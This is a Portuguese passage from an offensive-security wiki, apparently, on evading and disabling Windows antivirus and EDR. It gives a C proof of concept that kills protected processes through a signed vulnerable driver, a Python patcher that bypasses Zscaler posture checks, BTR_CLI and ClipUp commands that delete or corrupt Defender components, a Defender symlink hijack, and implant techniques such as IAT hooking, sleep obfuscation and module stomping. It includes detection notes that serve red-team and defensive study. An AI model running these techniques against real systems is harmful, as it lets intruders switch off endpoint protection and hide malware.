1. **Driver assinado**: O arquivo gravado no disco é `ServiceMouse.sys`, mas o binário é o driver legitimamente assinado `AToolsKrnl64.sys`, do “System In-Depth Analysis Toolkit” da Antiy Labs. Como o driver tem uma assinatura válida da Microsoft, ele é carregado mesmo quando o Driver-Signature-Enforcement (DSE) está habilitado.
2. **Instalação do serviço**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   A primeira linha registra o driver como um **serviço do kernel** e a segunda o inicia, tornando `\\.\ServiceMouse` acessível a partir do userland.
3. **IOCTLs expostos pelo driver**
   | Código IOCTL | Capacidade                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Encerrar um processo arbitrário por PID (usado para encerrar serviços do Defender/EDR) |
   | `0x990000D0` | Excluir um arquivo arbitrário do disco |
   | `0x990001D0` | Descarregar o driver e remover o serviço |

   Prova de conceito mínima em C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Por que funciona**: BYOVD ignora completamente as proteções em modo de usuário; o código executado no kernel pode abrir processos *protegidos*, encerrá-los ou adulterar objetos do kernel, independentemente de PPL/PP, ELAM ou outros recursos de hardening.

Detecção / Mitigação
•  Habilite a lista de bloqueio de drivers vulneráveis da Microsoft (`HVCI`, `Smart App Control`) para que o Windows se recuse a carregar `AToolsKrnl64.sys`.
•  Monitore a criação de novos serviços do *kernel* e gere alertas quando um driver for carregado de um diretório com permissão de gravação para todos ou não estiver na lista de permissões.
•  Fique atento a handles de modo de usuário para objetos de dispositivo personalizados, seguidos por chamadas suspeitas a `DeviceIoControl`.

### Ignorando as verificações de postura do Zscaler Client Connector por meio de patch binário em disco

O **Client Connector** da Zscaler aplica regras de postura do dispositivo localmente e depende do RPC do Windows para comunicar os resultados a outros componentes. Duas decisões fracas de design tornam possível um bypass completo:

1. A avaliação de postura acontece **inteiramente no lado do cliente** (um booleano é enviado ao servidor).
2. Os endpoints internos de RPC apenas validam se o executável que se conecta está **assinado pela Zscaler** (via `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Ao **aplicar patch em quatro binários assinados no disco**, ambos os mecanismos podem ser neutralizados:

| Binário | Lógica original alterada pelo patch | Resultado |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Sempre retorna `1`, fazendo com que todas as verificações sejam aprovadas |
| `ZSAService.exe` | Chamada indireta a `WinVerifyTrust` | NOP-ed ⇒ qualquer processo (mesmo não assinado) pode se conectar aos pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Substituída por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Verificações de integridade do túnel | Ignoradas |

Trecho mínimo do patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Após substituir os arquivos originais e reiniciar a pilha de serviços:

* **Todas** as verificações de postura exibem **verde/conforme**.
* Binários não assinados ou modificados podem abrir os endpoints RPC de named pipe (por exemplo, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* O host comprometido obtém acesso irrestrito à rede interna definida pelas políticas do Zscaler.

Este estudo de caso demonstra como decisões de confiança puramente do lado do cliente e verificações simples de assinatura podem ser contornadas com alguns patches de bytes.

## Abuso de funcionalidade confiável do Microsoft Defender `BTR.sys`

O driver **Boot-Time Removal** do Defender é um contraexemplo útil ao BYOVD clássico. `BTR.sys` é um componente legítimo de correção assinado pela Microsoft, sem bug de corrupção de memória nem interface IOCTL; em vez disso, depois de obter acesso de administrador e `SeLoadDriverPrivilege`, um operador pode forjar sua transação privada de correção e obter operações intencionais de arquivo/registro em Ring-0. Isso é uma **primitiva de neutralização de AV/EDR pós-comprometimento, não de acesso inicial ou escalonamento de privilégios**, e o driver pode ser extraído do recurso `BOOTTIMETOOL` do próprio `MpEngine.dll` do alvo, em vez de importar um driver de terceiros que chamaria atenção.<sup>[[36]](#references)</sup>

### Preparando o driver de execução única

Normalmente, o Defender grava o recurso como um arquivo aleatório `[a-z]{8}.sys` e registra um serviço de kernel com nome semelhante. `DriverEntry` lê o valor `Args` do serviço, abre o ADS NTFS referenciado, descriptografa e valida a lista de ações, grava o feedback e retorna `0xC0000056` (`STATUS_DELETE_PENDING`) após a execução bem-sucedida, para que o driver seja descarregado em vez de permanecer residente. Um serviço forjado tem os seguintes valores característicos.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

O fluxo `:changelist` contém um blob criptografado com RC4. As builds analisadas reutilizam uma chave fixa de 256 bytes, portanto a criptografia não é um limite de autorização. Um texto simples válido tem um cabeçalho global de 24 bytes (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC do cabeçalho e um ID de transação derivado do payload), seguido por um caminho de feedback UTF-16 terminado em nulo e qualquer quantidade de itens. Cada item tem um cabeçalho de 16 bytes (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`), além de dados específicos da ação terminados em **exatamente quatro bytes NUL**. Cada região de cabeçalho/dados é verificada de forma independente com CRC-32, polinômio `0xEDB88320`, estado inicial `0xFFFFFFFF` e **sem XOR final** (`~CRC32`); o estado do CRC é reiniciado para cada região.<sup>[[36]](#references)[[37]](#references)</sup>

Os IDs de ação aceitos expõem estas primitivas do kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dados do item | Resultado |
| --- | --- | --- |
| 1 | `[caminho UTF-16]` | Exclui um arquivo, inclusive um arquivo bloqueado |
| 2 | `[caminho UTF-16]` | Remove um diretório vazio |
| 3 | `[Flags][origem][destino]` | Move um arquivo para um caminho protegido escolhido pelo atacante; um destino vazio significa excluir |
| 4 | `[Flags][caminho da chave]` | Exclui recursivamente uma chave do registro |
| 5 | `[Flags][caminho da chave + "\\" + valor]` | Exclui um valor do registro |
| 6 | `[Flags][tipo][tamanho][caminho da chave + "\\" + valor][dados]` | Cria/atualiza um valor do registro e cria os caminhos de chave ausentes |

Para as ações 5 e 6, o separador de chave/valor no formato serializado é **duas barras invertidas consecutivas**; um caminho formatado convencionalmente não será dividido corretamente. O arquivo de feedback espelha, em grande parte, a solicitação, mas os quatro primeiros bytes de dados de cada item passam a conter seu `NTSTATUS` resultante. Para as ações 1 e 2, que não têm um campo de flags inicial, o BTR desloca o caminho para os quatro bytes reservados finais para abrir espaço para esse status.<sup>[[36]](#references)</sup>

### Fluxo de trabalho `BTR_CLI` e janela de inicialização antecipada

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementa a cadeia completa: extrai `BTR.sys` do Defender local, cria `<random>.sys:changelist` e um fluxo de feedback, serializa/verifica os checksums/criptografa ações encadeadas, cria diretamente a chave de registro do serviço e, em seguida, chama `NtLoadDriver` para `-trigger now` ou deixa o driver como um driver de inicialização do sistema para `-trigger boot`. A preparação direta no registro evita o caminho normal do SCM `CreateServiceW` e, portanto, **não** gera o Event ID 7045 de instalação do serviço. Artefatos acionados na inicialização podem ser removidos posteriormente com `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` não é utilizável porque o BTR realiza I/O de arquivos a partir de `DriverEntry`, antes que a pilha de armazenamento e o link `SystemRoot` estejam prontos. `Start=1` junto com o grupo de alta prioridade `Boot Bus Extender` executa, em vez disso, na Fase 1: o NTFS está utilizável, mas muitos drivers de segurança com início pelo sistema e serviços EDR em modo de usuário ainda não foram inicializados. Filtros com início no boot, como `WdFilter`, podem já estar carregados, mas o BTR pode remover seus binários ou a configuração de serviço antes da próxima inicialização e pode excluir executáveis de serviço antes que o SCM os inicie. O ELAM não fecha essa brecha porque o BTR é executado após a avaliação dos drivers de boot e possui uma assinatura válida da Microsoft.<sup>[[36]](#references)</sup>

Várias ações são executadas em uma única transação. A PoC precede as demais com a Ação 1, direcionada ao caminho fixo `\SystemRoot\Temp\BootClean.log`: o BTR cria esse log, depois processa sua própria solicitação de exclusão e o remove antes de descarregar. Isso reduz os vestígios, enquanto armazenar o feedback em `<random>.sys:<random>.dat` permite remover o driver e ambos os streams de uma só vez.<sup>[[36]](#references)[[37]](#references)</sup>

### Correlações de alta confiança

Regras baseadas apenas em assinatura e a lista de bloqueio de drivers vulneráveis da Microsoft não impedem o abuso da funcionalidade prevista do BTR. Prefira estas correlações comportamentais, distinguindo a linhagem legítima do Defender de um launcher arbitrário.<sup>[[36]](#references)</sup>

- **Sysmon 15:** a criação de `.sys:changelist` é universal no staging do BTR. Um ADS `.dat` associado ao mesmo `.sys` é especialmente suspeito, pois o Defender legítimo normalmente armazena feedback em `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 sem System 7045:** correlacione a criação direta de `HKLM\SYSTEM\CurrentControlSet\Services\<random>`, contendo `Args=...:changelist` e `Group=Boot Bus Extender`, sem um evento de instalação correspondente do SCM.
- **Sysmon 6 -> 23:** correlacione o carregamento de um driver BTR conhecido, fora da linhagem do Defender, com a exclusão subsequente de arquivos atribuída a `System`/PID 4, especialmente no caso de binários de segurança.
- **Sysmon 11 -> 23:** gere alertas para a criação e exclusão rápida de `\SystemRoot\Temp\BootClean.log` por `System`/PID 4.
- Restrinja e audite a atribuição/ativação de `SeLoadDriverPrivilege`; uma assinatura da Microsoft, por si só, não é suficiente para confiar quando um driver de ferramenta de segurança é preparado por `cmd.exe`, PowerShell ou um processo desconhecido.

## Abusando do Protected Process Light (PPL) para adulterar AV/EDR com LOLBINs

O Protected Process Light (PPL) impõe uma hierarquia de assinantes/níveis, de modo que somente processos protegidos de nível igual ou superior possam adulterar uns aos outros. Do ponto de vista ofensivo, se você conseguir iniciar legitimamente um binário habilitado para PPL e controlar seus argumentos, poderá transformar uma funcionalidade benigna (por exemplo, logging) em uma primitiva de gravação restrita e respaldada pelo PPL, capaz de atuar contra diretórios protegidos usados por AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

O que faz um processo ser executado como PPL
- O EXE de destino (e quaisquer DLLs carregadas) deve ser assinado com um EKU compatível com PPL.
- O processo deve ser criado com CreateProcess usando os sinalizadores: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Deve ser solicitado um nível de proteção compatível com o assinante do binário (por exemplo, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` para assinantes antimalware, `PROTECTION_LEVEL_WINDOWS` para assinantes do Windows). Níveis incorretos farão a criação falhar.

Veja também uma introdução mais ampla a PP/PPL e à proteção do LSASS aqui:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Ferramentas de launcher
- Ferramenta auxiliar de código aberto: CreateProcessAsPPL (seleciona o nível de proteção e encaminha argumentos ao EXE de destino):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Padrão de uso:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Primitiva LOLBIN: ClipUp.exe
- O binário de sistema assinado `C:\Windows\System32\ClipUp.exe` inicia um processo filho e aceita um parâmetro para gravar um arquivo de log em um caminho especificado pelo chamador.
- Quando iniciado como um processo PPL, a gravação do arquivo é feita com proteção PPL.
- O ClipUp não consegue analisar caminhos que contenham espaços; use caminhos curtos 8.3 para apontar para locais normalmente protegidos.

Ajudantes para caminhos curtos 8.3
- Listar nomes curtos: `dir /x` em cada diretório pai.
- Derivar o caminho curto no cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Cadeia de abuso (abstrata)
1) Inicie o LOLBIN com capacidade PPL (ClipUp) com `CREATE_PROTECTED_PROCESS` usando um launcher (por exemplo, CreateProcessAsPPL).
2) Passe o argumento de caminho do log do ClipUp para forçar a criação de um arquivo em um diretório protegido do AV (por exemplo, Defender Platform). Use nomes curtos 8.3, se necessário.
3) Se o AV normalmente mantiver o binário de destino aberto/bloqueado enquanto estiver em execução (por exemplo, MsMpEng.exe), agende a gravação na inicialização, antes de o AV iniciar, instalando um serviço de início automático que seja executado com confiabilidade antes dele. Valide a ordem de inicialização com o Process Monitor (registro de inicialização).
4) Na reinicialização, a gravação protegida por PPL ocorre antes de o AV bloquear seus binários, corrompendo o arquivo de destino e impedindo a inicialização.

Exemplo de invocação (caminhos ocultados/abreviados por segurança):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Observações e restrições
- Você não pode controlar o conteúdo que o ClipUp grava, apenas o local; a primitiva é adequada para corrupção, não para injeção precisa de conteúdo.
- Requer privilégios locais de administrador/SYSTEM para instalar/iniciar um serviço e uma janela para reinicialização.
- O timing é crítico: o alvo não pode estar aberto; a execução durante a inicialização evita bloqueios de arquivo.

Detecções
- Criação de processos do `ClipUp.exe` com argumentos incomuns, especialmente quando iniciados por launchers não padrão, durante a inicialização.
- Novos serviços configurados para iniciar automaticamente binários suspeitos e que iniciam consistentemente antes do Defender/AV. Investigue a criação/modificação de serviços antes das falhas de inicialização do Defender.
- Monitoramento da integridade de arquivos dos binários/diretórios Platform do Defender; criações/modificações inesperadas por processos com flags de processo protegido.
- Telemetria ETW/EDR: procure processos criados com `CREATE_PROTECTED_PROCESS` e uso anômalo de nível PPL por binários que não sejam de AV.

Mitigações
- WDAC/Code Integrity: restrinja quais binários assinados podem ser executados como PPL e sob quais processos pai; bloqueie a execução do ClipUp fora de contextos legítimos.
- Higiene de serviços: restrinja a criação/modificação de serviços de inicialização automática e monitore a manipulação da ordem de inicialização.
- Garanta que a proteção contra adulteração do Defender e as proteções de inicialização antecipada estejam habilitadas; investigue erros de inicialização que indiquem corrupção de binários.
- Considere desabilitar a geração de nomes curtos 8.3 em volumes que hospedam ferramentas de segurança, se isso for compatível com seu ambiente (teste cuidadosamente).

## Adulteração do Microsoft Defender via Symlink Hijack da pasta de versão da Platform

O Windows Defender escolhe a plataforma da qual é executado enumerando as subpastas em:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Ele seleciona a subpasta com a string de versão lexicograficamente mais alta (por exemplo, `4.18.25070.5-0`) e inicia os processos do serviço Defender a partir dela (atualizando os caminhos do serviço/registro de acordo). Essa seleção confia nas entradas de diretório, incluindo pontos de nova análise de diretório (symlinks). Um administrador pode aproveitar isso para redirecionar o Defender para um caminho gravável pelo atacante e obter DLL sideloading ou interromper o serviço.<sup>[[21]](#references)[[22]](#references)</sup>

Pré-requisitos
- Administrador local (necessário para criar diretórios/symlinks na pasta Platform)
- Capacidade de reiniciar ou acionar uma nova seleção da plataforma do Defender (reinicialização do serviço durante a inicialização)
- Apenas ferramentas integradas são necessárias (mklink)

Por que funciona
- O Defender bloqueia gravações nas próprias pastas, mas sua seleção de plataforma confia nas entradas de diretório e escolhe a versão lexicograficamente mais alta sem validar se o destino aponta para um caminho protegido/confiável.

Passo a passo (exemplo)
1) Prepare um clone gravável da pasta da plataforma atual, por exemplo, `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crie um symlink de diretório de versão superior dentro de Platform apontando para sua pasta:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Seleção do gatilho (reinicialização recomendada):
```cmd
shutdown /r /t 0
```
4) Verifique se MsMpEng.exe (WinDefend) é executado a partir do caminho redirecionado:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Você deve observar o novo caminho do processo em `C:\TMP\AV\` e a configuração do serviço/registro refletindo esse local.

Opções de pós-exploração
- DLL sideloading/execução de código: Solte/substitua DLLs que o Defender carrega do diretório do aplicativo para executar código nos processos do Defender. Consulte a seção acima: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Interrupção/negação do serviço: Remova o link simbólico da versão para que, na próxima inicialização, o caminho configurado não seja resolvido e o Defender não consiga iniciar:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Observe que esta técnica não proporciona escalonamento de privilégios por si só; ela requer direitos de administrador.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

As equipes red team podem transferir a evasão em tempo de execução do implante C2 para o próprio módulo de destino, fazendo hooking da Import Address Table (IAT) e direcionando APIs selecionadas por meio de código independente de posição (PIC) controlado pelo atacante. Isso generaliza a evasão para além da pequena superfície de API exposta por muitos kits (por exemplo, CreateProcessA) e estende as mesmas proteções a BOFs e DLLs de post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Abordagem de alto nível
- Prepare um blob PIC junto ao módulo de destino usando um reflective loader (preposto ou complementar). O PIC deve ser autocontido e independente de posição.
- Durante o carregamento da DLL hospedeira, percorra seu IMAGE_IMPORT_DESCRIPTOR e aplique patch nas entradas da IAT das importações selecionadas (por exemplo, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) para apontarem para wrappers PIC enxutos.
- Cada wrapper PIC executa as evasões antes de chamar a API real em tail-call. As evasões típicas incluem:
  - Mascaramento/desmascaramento de memória durante a chamada (por exemplo, criptografar regiões do beacon, RWX→RX, alterar nomes/permissões de páginas) e restaurar depois da chamada.
  - Call-stack spoofing: construir uma stack benigna e fazer a transição para a API de destino para que a análise da call stack resolva para os frames esperados.<sup>[[9]](#references)</sup>
- Para garantir compatibilidade, exporte uma interface para que um script Aggressor (ou equivalente) possa registrar quais APIs devem ter hooking aplicado para Beacon, BOFs e DLLs de post-exploitation.

Por que usar IAT hooking aqui
- Funciona com qualquer código que use a importação interceptada, sem modificar o código da ferramenta nem depender do Beacon para fazer proxy de APIs específicas.
- Abrange DLLs de post-exploitation: fazer hooking de LoadLibrary* permite interceptar carregamentos de módulos (por exemplo, System.Management.Automation.dll, clr.dll) e aplicar o mesmo mascaramento/evasão de stack às chamadas de API deles.
- Restaura o uso confiável de comandos de post-exploitation que criam processos contra detecções baseadas em call stack, usando wrappers para CreateProcessA/W.

Esboço mínimo de IAT hook (pseudocódigo em C/C++ x64)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Aplique o patch após as relocations/ASLR e antes do primeiro uso da importação. Loaders reflective como TitanLdr/AceLdr demonstram hooking durante o DllMain do módulo carregado.
- Mantenha os wrappers pequenos e seguros para PIC; resolva a API verdadeira usando o valor original da IAT capturado antes do patch ou via LdrGetProcedureAddress.
- Use transições RW → RX para PIC e evite deixar páginas graváveis e executáveis.

Stub de call-stack spoofing
- Stubs PIC no estilo Draugr constroem uma cadeia de chamadas falsa (return addresses em módulos benignos) e então transferem o controle para a API real.
- Isso contorna detecções que esperam stacks canônicas de Beacon/BOFs para APIs sensíveis.
- Combine com técnicas de stack cutting/stack stitching para chegar aos frames esperados antes do prologue da API.

Integração operacional
- Anteponha o loader reflective às DLLs post-ex para que o PIC e os hooks sejam inicializados automaticamente quando a DLL for carregada.
- Use um script Aggressor para registrar APIs alvo, permitindo que Beacon e BOFs se beneficiem da mesma rota de evasão de forma transparente, sem alterações no código.

Considerações de detecção/DFIR
- Integridade da IAT: entradas que apontam para endereços não pertencentes a imagens (heap/anônimos); verificação periódica dos ponteiros de importação.
- Anomalias de stack: return addresses que não pertencem a imagens carregadas; transições abruptas para PIC não pertencente a imagens; ancestralidade inconsistente de RtlUserThreadStart.
- Telemetria do loader: escritas na IAT dentro do processo, atividade antecipada de DllMain que modifica import thunks, regiões RX inesperadas criadas durante o carregamento.
- Evasão de image-load: se fizer hooking de LoadLibrary*, monitore carregamentos suspeitos de assemblies de automação/clr correlacionados a eventos de memory masking.

Blocos de construção e exemplos relacionados
- Loaders reflective que fazem IAT patching durante o carregamento (por exemplo, TitanLdr, AceLdr)
- Hooks de memory masking (por exemplo, simplehook) e PIC de stack-cutting (stackcutting)
- Stubs PIC de call-stack spoofing (por exemplo, Draugr)


## IAT Hooking durante a importação + Sleep Obfuscation (Crystal Palace/PICO)

### IAT hooks durante a importação via um PICO residente

Se você controla um loader reflective, pode fazer hooking de imports **durante** `ProcessImports()` substituindo o ponteiro `GetProcAddress` do loader por um resolver personalizado que verifica os hooks primeiro:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Crie um **PICO residente** (objeto PIC persistente) que permaneça ativo depois que o PIC transitório do loader for liberado.
- Exporte uma função `setup_hooks()` que sobrescreva o resolver de imports do loader (por exemplo, `funcs.GetProcAddress = _GetProcAddress`).
- Em `_GetProcAddress`, ignore imports por ordinal e use uma busca de hooks baseada em hash, como `__resolve_hook(ror13hash(name))`. Se houver um hook, retorne-o; caso contrário, delegue para o `GetProcAddress` real.
- Registre os alvos dos hooks no momento da linkagem com entradas Crystal Palace `addhook "MODULE$Func" "hook"`. O hook permanece válido porque está dentro do PICO residente.

Isso permite **redirecionamento da IAT durante a importação** sem fazer patch na seção de código da DLL carregada após o carregamento.

### Forçar imports interceptáveis quando o alvo usa PEB-walking

Os hooks durante a importação só são acionados se a função estiver realmente na IAT do alvo. Se um módulo resolver APIs via PEB-walk + hash (sem entrada de importação), force uma importação real para que o caminho `ProcessImports()` do loader a detecte:

- Substitua a resolução de exports por hash (por exemplo, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) por uma referência direta, como `&WaitForSingleObject`.
- O compilador gera uma entrada na IAT, permitindo a interceptação quando o loader reflective resolver os imports.

### Sleep/idle obfuscation no estilo Ekko sem fazer patch em `Sleep()`

Em vez de fazer patch em `Sleep`, faça hooking das **primitivas reais de wait/IPC** usadas pelo implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Para waits longos, envolva a chamada em uma cadeia de obfuscation no estilo Ekko que criptografa a imagem em memória durante o idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Use `CreateTimerQueueTimer` para agendar uma sequência de callbacks que chamam `NtContinue` com frames `CONTEXT` preparados.
- Cadeia típica (x64): definir a imagem como `PAGE_READWRITE` → criptografar com RC4 via `advapi32!SystemFunction032` sobre toda a imagem mapeada → executar o wait bloqueante → descriptografar com RC4 → **restaurar as permissões por seção** percorrendo as seções PE → sinalizar a conclusão.
- `RtlCaptureContext` fornece um `CONTEXT` modelo; clone-o em vários frames e defina os registradores (`Rip/Rcx/Rdx/R8/R9`) para invocar cada etapa.

Detalhe operacional: retorne “success” para waits longos (por exemplo, `WAIT_OBJECT_0`) para que o chamador continue enquanto a imagem estiver mascarada. Esse padrão oculta o módulo dos scanners durante períodos idle e evita a assinatura clássica de `Sleep()` com patch.

Ideias de detecção (baseadas em telemetria)
- Rajadas de callbacks `CreateTimerQueueTimer` apontando para `NtContinue`.
- Uso de `advapi32!SystemFunction032` em buffers contíguos grandes, do tamanho de uma imagem.
- `VirtualProtect` aplicado a um intervalo grande, seguido pela restauração personalizada de permissões por seção.

### Registro de CFG em runtime para gadgets de sleep-obfuscation

Em alvos com CFG habilitado, o primeiro salto indireto para um gadget no meio de uma função, como `jmp [rbx]` ou `jmp rdi`, geralmente causa o crash do processo com `STATUS_STACK_BUFFER_OVERRUN`, pois o gadget não consta nos metadados CFG do módulo. Para manter cadeias no estilo Ekko/Kraken funcionando em processos protegidos:<sup>[[30]](#references)</sup>

- Registre cada destino indireto usado pela cadeia com `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` e entradas `CFG_CALL_TARGET_VALID`.
- Para endereços dentro de imagens carregadas (`ntdll`, `kernel32`, `advapi32`), o `MEMORY_RANGE_ENTRY` deve começar na **base da imagem** e cobrir o **tamanho total da imagem**.
- Para regiões mapeadas manualmente/PIC/stomped, use a **base da alocação** e o tamanho da alocação.
- Marque não apenas o gadget de dispatch, mas também os exports alcançados indiretamente (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, syscalls de wait/event) e quaisquer seções executáveis controladas pelo atacante que se tornarão destinos indiretos.

Isso transforma as cadeias de sleep no estilo ROP/JOP de uma técnica que “só funciona em processos sem CFG” em uma primitiva reutilizável para `explorer.exe`, navegadores, `svchost.exe` e outros endpoints compilados com `/guard:cf`.

### Stack spoofing compatível com CET para threads em sleep

A substituição completa de `CONTEXT` é ruidosa e pode falhar em sistemas com CET Shadow Stack, pois um `Rip` falsificado ainda precisa corresponder à shadow stack do hardware. Um padrão mais seguro para sleep-masking é:<sup>[[30]](#references)</sup>

- Escolha outra thread no mesmo processo e leia os limites da stack `NT_TIB` / TEB dela (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Faça backup do TEB/TIB real da thread atual.
- Capture o contexto real da thread em sleep com `GetThreadContext`.
- Copie **somente** o `Rip` real para o contexto spoof, mantendo o `Rsp`/estado da stack falsificados.
- Durante o período de sleep, copie o `NT_TIB` da thread spoof para o TEB atual, para que os stack walkers desenrolem a stack dentro de um intervalo legítimo.
- Após o fim do wait, restaure o TIB original e o contexto da thread.

Isso preserva um ponteiro de instrução compatível com CET e, ao mesmo tempo, engana os stack walkers do EDR que confiam nos metadados de stack do TEB para validar o unwind.

### Alternativa baseada em APC: Kraken Mask

Se o dispatch por timer-queue tiver uma assinatura muito conhecida, a mesma sequência de sleep-encrypt-spoof-restore pode ser executada por uma thread auxiliar suspensa usando APCs enfileiradas:<sup>[[27]](#references)</sup>

- Crie uma thread auxiliar com `NtTestAlert` como entrypoint.
- Enfileire frames `CONTEXT`/APCs preparados com `NtQueueApcThread` e processe-os com `NtAlertResumeThread`.
- Armazene o estado da cadeia no heap em vez de na stack auxiliar para evitar esgotar a stack padrão de thread de 64 KB.
- Use `NtSignalAndWaitForSingleObject` para sinalizar atomicamente o evento de início e bloquear.
- Suspenda a thread principal antes de restaurar o TIB/contexto (`NtSuspendThread` → restore → `NtResumeThread`) para reduzir a janela de race na qual um scanner poderia capturar uma stack parcialmente restaurada.

Isso substitui a assinatura `CreateTimerQueueTimer` + `NtContinue` por uma assinatura de thread auxiliar/APC, mantendo os mesmos objetivos de masking RC4 e stack spoofing.

Ideias adicionais de detecção
- `NtSetInformationVirtualMemory` com `VmCfgCallTargetInformation` pouco antes de sleeps, waits ou dispatch de APC.
- `GetThreadContext`/`SetThreadContext` envolvidos em chamadas a `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ou `ConnectNamedPipe`.
- `NtQueryInformationThread` seguido por escritas diretas nos limites da stack do TEB/TIB da thread atual.
- Cadeias `NtQueueApcThread`/`NtAlertResumeThread` que alcançam indiretamente `SystemFunction032`, `VirtualProtect` ou helpers de restauração de permissões de seção.
- Uso repetido de assinaturas curtas de gadgets, como `FF 23` (`jmp [rbx]`) ou `FF E7` (`jmp rdi`), como pivôs de dispatch dentro de módulos assinados.


## Module Stomping de precisão

Module stomping executa payloads a partir da **seção `.text` de uma DLL já mapeada dentro do processo alvo**, em vez de alocar memória executável privada óbvia ou carregar uma DLL sacrificial nova. O alvo de overwrite deve ser uma **imagem carregada, respaldada em disco**, cujo espaço de código possa acomodar o payload sem corromper caminhos de código que o processo ainda precisa.<sup>[[1]](#references)[[2]](#references)</sup>

### Seleção confiável de alvos

Fazer stomping de forma ingênua contra módulos comuns, como `uxtheme.dll` ou `comctl32.dll`, é frágil: a DLL pode não estar carregada no processo remoto, e uma região de código pequena demais pode causar o crash do processo. Um fluxo de trabalho mais confiável é:

1. Enumere os módulos do processo alvo e mantenha uma **lista de inclusão apenas com nomes** das DLLs já carregadas.
2. Primeiro, compile o payload e registre seu **tamanho exato em bytes**.
3. Examine as DLLs candidatas em disco e compare `Misc_VirtualSize` da seção PE **`.text`** com o tamanho do payload. Isso é mais importante que o tamanho do arquivo, pois reflete o tamanho da seção executável **quando mapeada na memória**.
4. Analise a **Export Address Table (EAT)** e escolha o RVA de uma função exportada como offset inicial do stomp.
